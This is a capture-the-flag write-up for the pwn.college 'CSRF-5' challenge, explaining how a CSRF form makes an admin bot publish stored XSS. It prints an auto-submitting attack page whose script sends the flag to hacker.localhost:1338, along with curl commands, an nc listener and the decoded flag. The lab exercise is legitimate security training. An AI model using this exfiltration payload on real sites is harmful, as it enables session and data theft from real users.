---
layout: page
title: "CSRF-5 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this challenge, we are given a Flask application using a temporary SQLite database. The goal is to exploit a **Cross-Site Request Forgery (CSRF)** vulnerability that tricks the victim (admin bot) into submitting a form containing malicious JavaScript. This script is then executed by the admin’s browser, allowing us to exfiltrate sensitive data (e.g., the flag).

## 📜 Server Behavior

The server has the following key endpoints:

- `/login`: logs in a user and sets a session cookie.
- `/draft`: allows creating a post, with optional `publish=on`.
- `/publish`: renders the published post with JavaScript enabled.
- `/victim`: simulates the admin visiting the page.
- `/`: homepage, includes the flag in source.

## 🎯 Objective

Make the admin visit a malicious page that submits a CSRF form to `/draft` with a payload that publishes a post containing XSS JavaScript. This JavaScript grabs the flag from `/` and sends it to our server.

---

## 💣 Attack Strategy

1. Host a malicious HTML page.
2. The page auto-submits a CSRF form to `/draft` with `content` containing a `<script>` tag.
3. The script:
   - Fetches the homepage (`/`)
   - Extracts the flag using regex
   - Sends the flag to our server via query string

---

## 🛠️ Attack HTML (Payload)

Save this as `index.html`:

```html
<html>
  <body>
    <form id="csrf" action="http://challenge.localhost:80/draft" method="POST">
      <input type="hidden" name="content" value='<script>
        fetch("/") 
          .then(r => r.text())
          .then(t => {
            let flag = t.match(/pwn\.college\{.*?\}/);
            if (flag) {
              fetch("http://hacker.localhost:1338/?" + btoa(flag[0]));
            }
          });
      </script>'>
      <input type="hidden" name="publish" value="on">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
### Hosting the Payload
Host the file on port 1337:
```
python3 -m http.server 1337
```
### Get Session Cookie (as hacker)
```bash
curl -i -s -X POST http://challenge.localhost/login \
  -d "username=hacker&password=1337" \
  -c cookie.txt
```
Extract the session cookie from response headers:
```
Set-Cookie: session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.<sig>
```

### Post the Payload
Submit the draft using the session cookie:
```bash
curl -X POST http://challenge.localhost/draft \
  -b "session=<your_cookie>" \
  -d "content=<script>...flag steal script...</script>&publish=on"
```

### Trigger the Admin Visit
Simulate the admin visiting the attacker's page:
```
curl http://challenge.localhost/victim
```
This will load your http://hacker.localhost:1337/ page, triggering the auto-submit CSRF.


### Catch the Flag
Run a listener to capture exfiltrated data:
```
nc -lvnp 1338
```
You will see:
```
GET /?cHduLmNvbGxlZ2V7WmZZYnpFT0pOeFlYdEt6dEpBTXdFS1RkeVZTSHZMRW1Oek5MeU93MHpNdXJqTzBZMHl9 HTTP/1.1
```
Decode the base64:
```bash
echo 'cHduLmNvbGxlZ2V7WmZZYnpFT0pOeFlYdEt6dEpBTXdFS1RkeVZTSHZMRW1Oek5MeU93MHpNdXJqTzBZMHl9' | base64 -d
```
Output:
```bash
pwn.college{ZfYbzEOJNyXYtKztJAMwEKTdyVSHvLEmNzNLyOw0zMurjO0Y0y}
```
---
##  Final Flag
```
pwn.college{ZfYbzEOJNyXYtKztJAMwEKTdyVSHvLEmNzNLyOw0zMurjO0Y0y}
```
---

